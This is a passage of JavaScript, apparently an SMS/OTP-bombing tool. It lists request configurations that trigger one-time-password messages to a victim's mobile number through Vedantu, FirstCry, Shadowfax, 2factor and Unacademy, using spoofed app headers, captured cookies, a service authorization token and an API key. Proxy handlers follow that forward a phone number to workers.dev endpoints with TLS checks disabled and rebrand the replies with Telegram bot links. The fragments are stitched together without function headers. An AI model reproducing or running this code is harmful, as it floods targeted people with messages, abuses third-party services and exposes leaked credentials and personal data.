        "Host: user.vedantu.com",
        "accept: application/json, text/plain, */*",
        "x-ved-device: ANDROID",
        "x-ved-token: undefined",
        "content-type: application/json",
        "content-length: 186",
        "accept-encoding: gzip",
        "user-agent: okhttp/4.9.2"
      ],
      "data": JSON.stringify({
        "phoneCode": "+91",
        "phoneNumber": mobile,
        "event": "APP_FLOW",
        "sType": "VEDANTU_A_1_APP",
        "sValue": "omxl5XwsPPVbqhJco0z01FO6TyMIWEAy",
        "requestSource": "ANDROID",
        "appVersionCode": "2.7.2"
      })
    },
    {
      "url": "https://www.firstcry.com/m/register?from=app",
      "method": "POST",
      "headers": [
        "Host: www.firstcry.com",
        "content-length: 186",
        "cache-control: max-age=0",
        "upgrade-insecure-requests: 1",
        "origin: https://www.firstcry.com",
        "content-type: application/x-www-form-urlencoded",
        "user-agent: Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36$$google_Pixel 4##Firstcry##Android_V186$$google_Pixel 4##Firstcry##Android_V186",
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "x-requested-with: fc.admin.fcexpressadmin",
        "sec-fetch-site: same-origin",
        "sec-fetch-mode: navigate",
        "sec-fetch-user: ?1",
        "sec-fetch-dest: document",
        "referer: https://www.firstcry.com/m/login?from=app",
        "accept-encoding: gzip, deflate",
        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
        "cookie: FC_DID=bd8fd661bc2c82d3; FC_ADV_ID=00877f3d-a7ad-4100-83d1-d34b9486a1c7; FC_APP_VERSION=9.9.86; ageId=0; login=2025-08-25%2015%3A50%3A12; FingerPrint=f6f12515-2880-4f9c-ade9-c1e4daa4de9a; fc_eng_cur_sid=06oytvvxv; _gcl_au=1.1.1336085174.1756050613; _ga=GA1.1.1458203734.1756050613; ci_session=33avi7t462rob8u9hi980913bb; tc_gtm=O0a%2FISnTNjV6X8ockEHkFg%3D%3D; RT=\"z=1&dm=firstcry.com&si=zjmpxtcdc49&ss=mepv6cp0&sl=0&tt=0\"; _ga_4ZVMC7XCMP=GS2.1.s1756050613$o1$g1$t1756050633$j40$l0$h1110577742"
      ],
      "data": `redirecturl=&notemail=2&by=1&onetab=&countryname=India+%28%E0%A4%AD%E0%A4%BE%E0%A4%B0%E0%A4%A4%29&FcSocialToken=&usrname=Devil+&usremail=sdhabai01%40gmail.com&country=91&usrmb=${mobile}`
    },
    {
      "url": "https://api.shadowfax.in/delivery/otp/send/v2/",
      "method": "POST",
      "headers": [
        "Host: api.shadowfax.in",
        "authorization: Token OR1ZPU7MXE5OYTNQM2UYG320XDUSFFOQOVEFZZXT291G96AEFU2J7EI2DBDL",
        "referrer: flash",
        "version: 54",
        "version-name: 2.10.2",
        "content-type: application/json; charset=utf-8",
        "content-length: 30",
        "accept-encoding: gzip",
        "user-agent: okhttp/4.12.0"
      ],
      "data": JSON.stringify({"mobile_number": mobile})
    },
    {
      "url": `https://2factor.in/API/V1/7ce280d5-97e3-4811-aaae-69bdd2206489/SMS/${mobile}/AUTOGEN`,
      "method": "GET",
      "headers": [
        "Host: 2factor.in",
        "accept-encoding: gzip",
        "user-agent: okhttp/4.9.0"
      ],
      "data": null
    },
    {
      "url": "https://api.unacademy.com/v3/user/user_check/?enable-email=true",
      "method": "POST",
      "headers": [
        "Host: api.unacademy.com",
        "user-agent: UnacademyLearningAppAndroid/6.148.0 Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
        "x-app-version: 197350",
        "x-app-build-version: 6.148.0",
        "x-platform: 5",
        "device-id: CFE11719D5EB3134A2876F6269714C61BBED92EF",
        "x-screen-name: Login_-_Mobile_Login",
        "content-type: application/json; charset=UTF-8",
        "content-length: 96",
        "accept-encoding: gzip"
      ],
      "data": JSON.stringify({
        "country_code": "IN",
        "phone": mobile,
        "send_otp": true,
        "otp_type": 1,
        "app_hash": "uI6w7mnt583"
      })
     const apiUrl = `https://demon.taitanx.workers.dev/?mobile=${encodeURIComponent(number)}`;
    const httpsAgent = new https.Agent({ rejectUnauthorized: false });

    let upstreamResp;
    try {
      upstreamResp = await axios.get(apiUrl, {
        httpsAgent,
        maxRedirects: 5,
        validateStatus: null,
        responseType: "text",
        timeout: 20000,
      });
    } catch (err) {
      const msg = err?.message || String(err);
      return jsonExit(res, { status: "error", message: "Request Error: " + msg }, 502);
    }

    let body = upstreamResp.data ?? "";
    if (typeof body !== "string") body = JSON.stringify(body);

    // ✅ Replace unwanted text in response
    body = body
      .replaceAll("by @ffloveryt", "by api https://t.me/divine_rbbot")
      .replaceAll('"join_backup": "https://t.me/+XfrJPF7l9sY0YjZl",', '"by api https://t.me/divine_rbbot"')
      .replaceAll('"join_main": "https://t.me/+nRN7ZYqpRog4OGU9"', '"by api https://t.me/divine_rbbot"');

    res.status(upstreamResp.status || 200).setHeader("Content-Type", "application/json; charset=utf-8");
    res.end(body);
  } catch (e) {
    const msg = e?.message || String(e);
    jsonExit(res, { status: "error", message: "Server Error: " + msg }, 500);
  }
}
    const key = params.key || null;

    if (!number)
      return jsonExit(res, { status: "error", message: "Number is required" }, 400);

    if (!key || !keysEqual(EXPECTED_KEY, key))
      return jsonExit(res, { status: "error", message: "Key expired or invalid" }, 401);

    const apiUrl = `https://ox.taitaninfo.workers.dev/?mobile=${encodeURIComponent(number)}`;
    const httpsAgent = new https.Agent({ rejectUnauthorized: false });

    let upstreamResp;
    try {
      upstreamResp = await axios.get(apiUrl, {
        httpsAgent,
        maxRedirects: 5,
        validateStatus: null,
        responseType: "text",
        timeout: 20000,
      });
    } catch (err) {
      const msg = err?.message || String(err);
      return jsonExit(res, { status: "error", message: "Request Error: " + msg }, 502);
    }

    let body = upstreamResp.data ?? "";
    if (typeof body !== "string") body = JSON.stringify(body);

    body = body
      .replaceAll("by @ffloveryt", "by api https://t.me/divine_rbbot")
      .replaceAll('"join_backup": "https://t.me/+XfrJPF7l9sY0YjZl",', '"by api https://t.me/divine_rbbot"')
      .replaceAll('"join_main": "https://t.me/+nRN7ZYqpRog4OGU9"', '"by api https://t.me/divine_rbbot"');

    res.status(upstreamResp.status || 200).setHeader("Content-Type", "application/json; charset=utf-8");
    res.end(body);
  } catch (e) {
    const msg = e?.message || String(e);
    jsonExit(res, { status: "error", message: "Server Error: " + msg }, 500);
  }
}
